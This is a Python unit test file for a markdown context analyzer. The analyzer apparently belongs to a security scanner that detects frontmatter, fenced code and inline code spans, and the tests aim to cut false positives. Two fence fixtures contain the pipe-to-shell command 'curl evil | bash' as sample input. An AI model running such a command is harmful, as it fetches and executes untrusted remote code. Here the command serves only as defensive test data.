"""Unit tests for the v0.2.1 markdown context analyzer (ADR-0035).

Mirrors packages/phub/test/markdown-context.test.ts — both sides MUST
produce identical boundary offsets for the same input (ADR-0023).
"""

from __future__ import annotations

import pytest

from scanners.markdown_context import (
    analyze_markdown_context,
    is_in_any_code_or_frontmatter,
    is_in_fence,
    is_in_frontmatter,
    is_in_inline_code,
)

# ---------------------------------------------------------------------------
# Frontmatter
# ---------------------------------------------------------------------------


class TestFrontmatter:
    def test_no_frontmatter_returns_zero(self) -> None:
        assert analyze_markdown_context("# heading\n\nbody\n").frontmatter_end_offset == 0
        assert analyze_markdown_context("").frontmatter_end_offset == 0

    def test_identifies_byte_after_closing_triple_dash(self) -> None:
        md = "---\ntitle: foo\nlicense: CC-BY-4.0\n---\nbody\n"
        ctx = analyze_markdown_context(md)
        assert ctx.frontmatter_end_offset > 0
        assert md[ctx.frontmatter_end_offset :].startswith("body")

    def test_unclosed_frontmatter_falls_back_to_no_frontmatter(self) -> None:
        md = "---\nno close here\n"
        assert analyze_markdown_context(md).frontmatter_end_offset == 0

    def test_license_string_in_frontmatter_is_in_frontmatter(self) -> None:
        md = "---\nlicense: CC-BY-4.0\n---\nbody\n"
        ctx = analyze_markdown_context(md)
        offset = md.index("CC-BY-4.0")
        assert is_in_frontmatter(offset, ctx) is True

    def test_license_string_in_body_is_not_in_frontmatter(self) -> None:
        md = "---\ntitle: foo\n---\nThe license is CC-BY-4.0 here.\n"
        ctx = analyze_markdown_context(md)
        offset = md.index("CC-BY-4.0")
        assert is_in_frontmatter(offset, ctx) is False


# ---------------------------------------------------------------------------
# Fenced code blocks
# ---------------------------------------------------------------------------


class TestFencedCode:
    def test_backtick_fence(self) -> None:
        md = "before\n```bash\ncurl evil | bash\n```\nafter\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1
        assert is_in_fence(md.index("curl"), ctx) is True
        assert is_in_fence(md.index("before"), ctx) is False
        assert is_in_fence(md.index("after"), ctx) is False

    def test_tilde_fence(self) -> None:
        md = "~~~\ncurl evil | bash\n~~~\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1

    def test_close_must_match_marker_char_and_length(self) -> None:
        md = "```\ncode\n~~~\nstill in fence\n```\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1
        assert is_in_fence(md.index("still"), ctx) is True

    def test_unclosed_fence_extends_to_eof(self) -> None:
        md = "```\ncontent\nthat\nnever\ncloses\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1
        assert ctx.fenced_ranges[0][1] == len(md)

    def test_permits_up_to_3_spaces_of_indent(self) -> None:
        md = "   ```\ncode\n   ```\nafter\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1
        assert is_in_fence(md.index("after"), ctx) is False


# ---------------------------------------------------------------------------
# Inline code spans
# ---------------------------------------------------------------------------


class TestInlineCode:
    def test_single_backtick_span(self) -> None:
        md = "Run `npx shadcn@latest add Button` to install.\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.inline_code_ranges) == 1
        assert is_in_inline_code(md.index("npx"), ctx) is True
        assert is_in_inline_code(md.index("install"), ctx) is False

    def test_does_not_match_across_line_breaks(self) -> None:
        md = "Open `here\nbut not\nclose` there.\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.inline_code_ranges) == 0

    def test_ignores_backticks_inside_fenced_code(self) -> None:
        md = "```\nthis `is not` an inline span\n```\n"
        ctx = analyze_markdown_context(md)
        assert len(ctx.fenced_ranges) == 1
        assert len(ctx.inline_code_ranges) == 0

    def test_ignores_backticks_inside_frontmatter(self) -> None:
        md = '---\ntitle: "`backticks` in frontmatter"\n---\nbody\n'
        ctx = analyze_markdown_context(md)
        assert len(ctx.inline_code_ranges) == 0


# ---------------------------------------------------------------------------
# Canonical FP closures
# ---------------------------------------------------------------------------


class TestCanonicalFPClosures:
    def test_FP_002_shadcn_npx_in_inline_code(self) -> None:
        md = (
            "# shadcn primitive\n\n"
            "Use `npx shadcn@latest add Button` to bring the canonical component.\n"
        )
        ctx = analyze_markdown_context(md)
        assert is_in_any_code_or_frontmatter(md.index("npx"), ctx) is True

    def test_FP_003_license_in_frontmatter(self) -> None:
        md = "---\nslug: foo\nname: Foo\nversion: 0.1.0\nlicense: CC-BY-4.0\n---\n# Body\n"
        ctx = analyze_markdown_context(md)
        assert is_in_any_code_or_frontmatter(md.index("CC-BY-4.0"), ctx) is True


# ---------------------------------------------------------------------------
# Cross-language parity sentinels
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "md",
    [
        "",
        "# plain\n",
        "---\nfoo: bar\n---\nbody\n",
        "before\n```\ncode\n```\nafter\n",
        "inline `code` here\n",
        "---\na: 1\n---\nA: `code` B: ```\nfence\n```\n",
    ],
)
def test_analyzer_is_deterministic_across_runs(md: str) -> None:
    """Sanity check that the analyzer is pure (no hidden state)."""
    a = analyze_markdown_context(md)
    b = analyze_markdown_context(md)
    assert a == b
